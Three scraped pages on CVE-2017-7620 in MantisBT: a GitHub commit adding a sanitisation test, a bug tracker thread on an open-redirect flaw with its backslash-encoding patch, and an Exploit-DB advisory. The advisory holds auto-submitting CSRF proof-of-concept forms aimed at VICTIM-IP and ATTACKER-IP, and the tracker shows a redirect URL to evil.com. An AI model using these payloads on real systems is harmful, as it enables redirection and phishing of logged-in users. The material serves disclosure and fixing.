* [Code](/mantisbt/mantisbt)
* [Pull requests
  80](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

## Commit

[Permalink](/mantisbt/mantisbt/commit/241ff4eb4faca162e57faf8d317d5fc1c0fa4d62)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Add test for '\' encoding in in string\_sanitize\_url()

[Browse files](/mantisbt/mantisbt/tree/241ff4eb4faca162e57faf8d317d5fc1c0fa4d62)
Browse the repository at this point in the history

```
Issue #22702
```

* Loading branch information

[![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)

[dregad](/mantisbt/mantisbt/commits?author=dregad "View all commits by dregad")
committed
May 20, 2017

1 parent
[f664409](/mantisbt/mantisbt/commit/f66440902877103f312905257dbccdad02ab5a3b)

commit 241ff4e

Showing
**1 changed file**
with
**1 addition**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

1 change: 1 addition & 0 deletions

1
[tests/Mantis/StringTest.php](#diff-7c3b1d224688ff4512e175b2c9e39583cce2734929b0dd853f17546b7bd8df4a "tests/Mantis/StringTest.php")

Show comments

[View file](/mantisbt/mantisbt/blob/241ff4eb4faca162e57faf8d317d5fc1c0fa4d62/tests/Mantis/StringTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -82,6 +82,7 @@ public function provider() { |
|  |  | array( 'plugin.php?page=Source/list&id=1#abc', 'plugin.php?page=Source%2Flist&id=1#abc'), |
|  |  | array( 'login\_page.php?return=http://google.com/', 'index.php'), |
|  |  | array( 'javascript:alert(1);', 'index.php'), |
|  |  | array( '\/csrf-22702', '%5C/csrf-22702' ), |
|  |  | ); |
|  |  |  |
|  |  | # @FIXME |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `241ff4e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F241ff4eb4faca162e57faf8d317d5fc1c0fa4d62) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from mantisbt.org_7b46b536_20250126_031538.html ===

Toggle sidebar [MantisBT](/bugs//) Toggle user menu

* mantisbt

  + - [All Projects](/bugs/set_project.php?project_id=0)
    - [mantisbt](/bugs/set_project.php?project_id=1)
    - [Mylyn Connector](/bugs/set_project.php?project_id=20)
    - [Plugin - agileMantis](/bugs/set_project.php?project_id=25)
    - [Plugin - CsvImport](/bugs/set_project.php?project_id=11)
    - [Plugin - CustomerManagement](/bugs/set_project.php?project_id=21)
    - [Plugin - EmailReporting](/bugs/set_project.php?project_id=10)
    - [Plugin - FilterPageEdit](/bugs/set_project.php?project_id=15)
    - [Plugin - InlineColumnConfiguration](/bugs/set_project.php?project_id=14)
    - [Plugin - LinkedCustomFields](/bugs/set_project.php?project_id=16)
    - [Plugin - MantisTouchRedirect](/bugs/set_project.php?project_id=22)
    - [Plugin - RecurrCall](/bugs/set_project.php?project_id=6)
    - [Plugin - RelatedIssuesExport](/bugs/set_project.php?project_id=13)
    - [Plugin - Reminder](/bugs/set_project.php?project_id=7)
    - [Plugin - Tasks](/bugs/set_project.php?project_id=8)
    - [Plugin - Time Tracking](/bugs/set_project.php?project_id=18)
* anonymous
  + [RSS](https://mantisbt.org/bugs/issues_rss.php)
  + [Logout](/bugs/logout_page.php)

* [My View](/bugs/my_view_page.php)
* [View Issues](/bugs/view_all_bug_page.php)
* [Change Log](/bugs/changelog_page.php)
* [Roadmap](/bugs/roadmap_page.php)
* [Wiki](/bugs/wiki.php?type=project&id=1)
* [Repositories](/bugs/plugin.php?page=Source/index)

* Anonymous
[Login](/bugs/login_page.php?return=%2Fbugs%2Fview_user_page.php%3Fid%3D17784)
[Signup for a new account](/bugs/signup_page.php)

#### User Information

| Username | dregad |
| --- | --- |

**Powered by [MantisBT 2.28.0-dev-master-f0c253853](https://www.mantisbt.org "bug tracking software")**

Copyright © 2000 - 2025 MantisBT Team
Contact administrator for assistance

[![Powered by Mantis Bug Tracker: a free and open source web based bug tracking system.](/bugs/images/mantis_logo.png)](https://www.mantisbt.org "Mantis Bug Tracker: a free and open source web based bug tracking system.")

 Page execution time: 0.1631 seconds



=== Content from mantisbt.org_d1d7c3bd_20250124_200637.html ===

Toggle sidebar [MantisBT](/bugs//) Toggle user menu

* mantisbt

  + - [All Projects](/bugs/set_project.php?project_id=0)
    - [mantisbt](/bugs/set_project.php?project_id=1)
    - [Mylyn Connector](/bugs/set_project.php?project_id=20)
    - [Plugin - agileMantis](/bugs/set_project.php?project_id=25)
    - [Plugin - CsvImport](/bugs/set_project.php?project_id=11)
    - [Plugin - CustomerManagement](/bugs/set_project.php?project_id=21)
    - [Plugin - EmailReporting](/bugs/set_project.php?project_id=10)
    - [Plugin - FilterPageEdit](/bugs/set_project.php?project_id=15)
    - [Plugin - InlineColumnConfiguration](/bugs/set_project.php?project_id=14)
    - [Plugin - LinkedCustomFields](/bugs/set_project.php?project_id=16)
    - [Plugin - MantisTouchRedirect](/bugs/set_project.php?project_id=22)
    - [Plugin - RecurrCall](/bugs/set_project.php?project_id=6)
    - [Plugin - RelatedIssuesExport](/bugs/set_project.php?project_id=13)
    - [Plugin - Reminder](/bugs/set_project.php?project_id=7)
    - [Plugin - Tasks](/bugs/set_project.php?project_id=8)
    - [Plugin - Time Tracking](/bugs/set_project.php?project_id=18)
* anonymous
  + [RSS](https://mantisbt.org/bugs/issues_rss.php)
  + [Logout](/bugs/logout_page.php)

* [My View](/bugs/my_view_page.php)
* [View Issues](/bugs/view_all_bug_page.php)
* [Change Log](/bugs/changelog_page.php)
* [Roadmap](/bugs/roadmap_page.php)
* [Wiki](/bugs/wiki.php?type=project&id=1)
* [Repositories](/bugs/plugin.php?page=Source/index)

* Anonymous
[Login](/bugs/login_page.php?return=%2Fbugs%2Fview.php%3Fid%3D22816)
[Signup for a new account](/bugs/signup_page.php)

#### View Issue Details

[Wiki](wiki.php?id=22816)[Related Changesets](#changesets)[Jump to Notes](#bugnotes)

|  | | | | | |
| --- | --- | --- | --- | --- | --- |
| ID | Project | Category | View Status | Date Submitted | Last Update |
| --- | --- | --- | --- | --- | --- |
| 0022816 | mantisbt | security | public | 2017-04-26 02:53 | 2017-05-20 16:10 |
|  | | | | | |
|
| Reporter | [mahmoud.gamal](https://mantisbt.org/bugs/view_user_page.php?id=42632) | Assigned To | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) |  | |
| Priority | normal | Severity | major | Reproducibility | always |
| Status | closed | Resolution | fixed |  | |
| Product Version | 1.3.0-beta.1 |  | | | |
| Target Version | 1.3.11 | Fixed in Version | 1.3.11 |  | |
|  | | | | | |
|
| Summary | 0022816: CVE-2017-7620: Open redirection vulnerability in /login\_page.php | | | | |
| Description | Hi, This is Mahmoud Gamal from Seekurity (<https://seekurity.com>) , we use your bug tracker for our projects and while testing our system we have found an open redirection vulnerability at the login page. Proof of concept: <https://www.mantisbt.org/bugs/login_page.php?return=/\/evil.com> This will redirect to `https://evil.com` | | | | |
| Steps To Reproduce | While being authenticated, navigate to: <https://www.mantisbt.org/bugs/login_page.php?return=/\/evil.com> and you'll be redirected to `https://evil.com/` | | | | |
| Tags | No tags attached. | | | | |
|  | | | | | |
|

#### Relationships

[Relationship Graph](bug_relationship_graph.php?bug_id=22816&graph=relation)[Dependency Graph](bug_relationship_graph.php?bug_id=22816&graph=dependency)

| related to | [0022702](view.php?id=22702) | closed | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) | CVE-2017-7620: CSRF - Arbitrary Permalink Injection |
| --- | --- | --- | --- | --- |
| parent of | [0022906](view.php?id=22906) | closed | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) | CVE-2017-7620: Open redirection vulnerability in /login\_page.php |
| parent of | [0022907](view.php?id=22907) | closed | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) | CVE-2017-7620: Open redirection vulnerability in /login\_page.php |

#### Activities

| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-26 03:08  developer    [~0056717](view.php?id=22816#c56717 "Direct link to note") | Thanks for the bug report, we'll look into it.  Next time you discover a vulnerability, could you please mark the bug report as *private* to avoid unwanted public disclosure ? Thanks for your understanding. |
| --- | --- |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-26 03:13  developer    [~0056718](view.php?id=22816#c56718 "Direct link to note") | I didn't check in detail, but I have a feeling this is possibly the same root cause as [0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection") (i.e. *string\_sanitize\_url()* not handling escaped `/`) |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-04-26 03:18  developer    [~0056719](view.php?id=22816#c56719 "Direct link to note") | [@mahmoud.gamal](https://mantisbt.org/bugs/view_user_page.php?id=42632) Did you request a CVE for this ? If so, please let us know the ID, otherwise I can take care of it, let us know how you'd like to be credited for the finding.  FYI your website was blocked by my company's Blue Coat proxy filter due to being categorized as *Malicious Sources/MalnetsMalicious Sources/Malnets* <http://sitereview.bluecoat.com/sitereview.jsp#/?search=seekurity.com> |
|  | |
| [mahmoud.gamal](https://mantisbt.org/bugs/view_user_page.php?id=42632)   [mahmoud.gamal](https://mantisbt.org/bugs/view_user_page.php?id=42632)  2017-04-26 23:58  reporter    [~0056724](view.php?id=22816#c56724 "Direct link to note")  Last edited: 2017-04-27 05:09 | Hi [@dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784), I forgot to set the visibility to private, my bad.  I didn't request a CVE for this. for the credit, you can use my name: Mahmoud Gamal with a link to seekurity.com  Thanks for telling me about the website being marked as malicious, this is definitely a mistake, I have contacted my manager and we got this corrected: <http://sitereview.bluecoat.com/sitereview.jsp#/?search=seekurity.com>  Regards.  EDIT (dregad): I deleted your duplicated note. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-05-07 06:26  developer    [~0056791](view.php?id=22816#c56791 "Direct link to note") | Confirming that the proposed fix for [0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection") (escaping `\` in string\_sanitize\_url()) also addresses this issue. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-05-07 06:36  developer    [~0056792](view.php?id=22816#c56792 "Direct link to note") | I can confirm the vulnerability, affecting 1.3.0-beta.1 and later |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-05-07 08:45  developer    [~0056793](view.php?id=22816#c56793 "Direct link to note") | [@mahmoud.gamal](https://mantisbt.org/bugs/view_user_page.php?id=42632) please review the proposed patch below and let me know if that addresses the issue.  ``` diff --git a/core/string_api.php b/core/string_api.php index 4e3c238..fb2e65e 100644 --- a/core/string_api.php +++ b/core/string_api.php @@ -275,7 +275,9 @@ function string_sanitize_url( $p_url, $p_return_absolute = false ) {     }      # Start extracting regex matches -   $t_script = $t_matches['script']; +   # Encode backslashes to prevent unwanted escaping of a leading '/' allowing +   # redirection to external sites +   $t_script = strtr( $t_matches['script'], array( '\\' => '%5C' ) );     $t_script_path = $t_matches['path'];      # Clean/encode query params ``` |
|  | |
| [mahmoud.gamal](https://mantisbt.org/bugs/view_user_page.php?id=42632)   [mahmoud.gamal](https://mantisbt.org/bugs/view_user_page.php?id=42632)  2017-05-07 11:20  reporter    [~0056797](view.php?id=22816#c56797 "Direct link to note") | Hi [@dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784), I confirm that encoding backslashes addresses this issue. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2017-05-08 04:37  developer    [~0056803](view.php?id=22816#c56803 "Direct link to note") | Thanks for your confirmation.  Since the vulnerability you reported is addressed by the same patch as a similar issue in \_permalink*page.php* (see [0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection")), the same CVE ID (CVE-2017-7620) should be used for both issues, as per feedback from MITRE:  On 7 May 2017 at 17:18, cve-request@mitre.org wrote:  We have a confirmed, unpatched CSRF vulnerability in MantisBT (CVE-2017-7620, reported by John Page aka hyp3rlinx / ApparitionSec <http://hyp3rlinx.altervista.org>) affecting permalink\_page.php, which I'm currently working on fixing.  Another, similar vulnerability was reported which basically has the same root cause but affects a different page (login\_page.php).  Can you please let me know whether the 2nd issue should be logged under the same CVE ID, or if I should be requesting another one ?  There should be another CVE ID only if the two vulnerabilities are independently fixable. |
|  | |

#### Related Changesets

| MantisBT: master f6644090  2017-05-13 14:47  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23276) [Diff](https://github.com/mantisbt/mantisbt/commit/f66440902877103f312905257dbccdad02ab5a3b) | Encode '\' in string\_sanitize\_url() | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection"), [0022816](/bugs/view.php?id=22816 "[closed] CVE-2017-7620: Open redirection vulnerability in  /login_page.php") |
| --- | --- | --- | --- |
| mod - core/string\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/f66440902877103f312905257dbccdad02ab5a3b) [File](https://github.com/mantisbt/mantisbt/blob/f66440902877103f312905257dbccdad02ab5a3b/core/string_api.php) |
| MantisBT: master-1.3.x c4f50e5d  2017-05-19 07:48  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23273) [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) | Fix CSRF vulnerability in permalink\_page.php | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection"), [0022816](/bugs/view.php?id=22816 "[closed] CVE-2017-7620: Open redirection vulnerability in  /login_page.php") |
| mod - core/filter\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) [File](https://github.com/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/core/filter_api.php) |
| mod - core/string\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) [File](https://github.com/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/core/string_api.php) |
| mod - permalink\_page.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) [File](https://github.com/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/permalink_page.php) |
| mod - tests/Mantis/StringTest.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165) [File](https://github.com/mantisbt/mantisbt/blob/c4f50e5df6b189abb1d717a5f7dbab5cbfef8165/tests/Mantis/StringTest.php) |
| MantisBT: master-2.3 8b6787c8  2017-05-19 07:48  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23274) [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) | Fix CSRF vulnerability in permalink\_page.php | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection"), [0022816](/bugs/view.php?id=22816 "[closed] CVE-2017-7620: Open redirection vulnerability in  /login_page.php") |
| mod - core/filter\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) [File](https://github.com/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/core/filter_api.php) |
| mod - core/string\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) [File](https://github.com/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/core/string_api.php) |
| mod - permalink\_page.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) [File](https://github.com/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/permalink_page.php) |
| mod - tests/Mantis/StringTest.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) [File](https://github.com/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/tests/Mantis/StringTest.php) |
| MantisBT: master-2.4 2d2309a3  2017-05-19 07:48  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) [Details](/bugs/plugin.php?page=Source/view&id=23280) [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) | Fix CSRF vulnerability in permalink\_page.php | | Affected Issues[0022702](/bugs/view.php?id=22702 "[closed] CVE-2017-7620: CSRF - Arbitrary Permalink Injection"), [0022816](/bugs/view.php?id=22816 "[closed] CVE-2017-7620: Open redirection vulnerability in  /login_page.php") |
| mod - core/filter\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) [File](https://github.com/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/core/filter_api.php) |
| mod - core/string\_api.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) [File](https://github.com/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/core/string_api.php) |
| mod - permalink\_page.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) [File](https://github.com/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/permalink_page.php) |
| mod - tests/Mantis/StringTest.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) [File](https://github.com/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/tests/Mantis/StringTest.php) |

**Powered by [MantisBT 2.28.0-dev-master-f0c253853](https://www.mantisbt.org "bug tracking software")**

Copyright © 2000 - 2025 MantisBT Team
Contact administrator for assistance

[![Powered by Mantis Bug Tracker: a free and open source web based bug tracking system.](/bugs/images/mantis_logo.png)](https://www.mantisbt.org "Mantis Bug Tracker: a free and open source web based bug tracking system.")

 Page execution time: 0.1690 seconds



=== Content from www.exploit-db.com_d9178f3b_20250124_200638.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Mantis Bug Tracker 1.3.10/2.3.0 - Cross-Site Request Forgery

#### EDB-ID:

###### 42043

#### CVE:

###### [2017-7620](https://nvd.nist.gov/vuln/detail/CVE-2017-7620)

---

**EDB Verified:**

#### Author:

###### [hyp3rlinx](/?author=7955)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2017-05-20

---

**Vulnerable App:**

```
[+] Credits: John Page a.k.a hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-CSRF-PERMALINK-INJECTION.txt
[+] ISR: ApparitionSec

Vendor:
================
www.mantisbt.org

Product:
=========
Mantis Bug Tracker
1.3.10 / v2.3.0

MantisBT is a popular free web-based bug tracking system. It is written in PHP works with MySQL, MS SQL, and PostgreSQL databases.

Vulnerability Type:
========================
CSRF Permalink Injection

CVE Reference:
==============
CVE-2017-7620

Security Issue:
================
Remote attackers can inject arbitrary permalinks into the mantisbt Web Interface if an authenticated user visits a malicious webpage.

Vuln code in "string_api.php" PHP file, under mantis/core/ did not account for supplied backslashes.
Line: 270

# Check for URL's pointing to other domains

if( 0 == $t_type || empty( $t_matches['script'] ) ||

    3 == $t_type && preg_match( '@(?:[^:]*)?:/*@', $t_url ) > 0 ) {

    return ( $p_return_absolute ? $t_path . '/' : '' ) . 'index.php';

}

# Start extracting regex matches

$t_script = $t_matches['script'];
$t_script_path = $t_matches['path'];

Exploit/POC:
=============
<form action="http://VICTIM-IP/mantisbt-2.3.0/permalink_page.php?url=\/ATTACKER-IP" method="POST">
<script>document.forms[0].submit()</script>
</form>

OR

<form action="http://VICTIM-IP/permalink_page.php?url=\/ATTACKER-IP%2Fmantisbt-2.3.0%2Fsearch.php%3Fproject_id%3D1%26sticky%3Don%26sort%3Dlast_updated%26dir%3DDESC%26hide_status%3D90%26match_type%3D0" method="POST">
<script>document.forms[0].submit()</script>
</form>

Network Access:
===============
Remote

Severity:
=========
Medium

Disclosure Timeline:
=============================
Vendor Notification: April 9, 2017
Vendor Release Fix: May 15, 2017
Vendor Disclosed: May 20, 2017
May 20, 2017 : Public Disclosure

[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

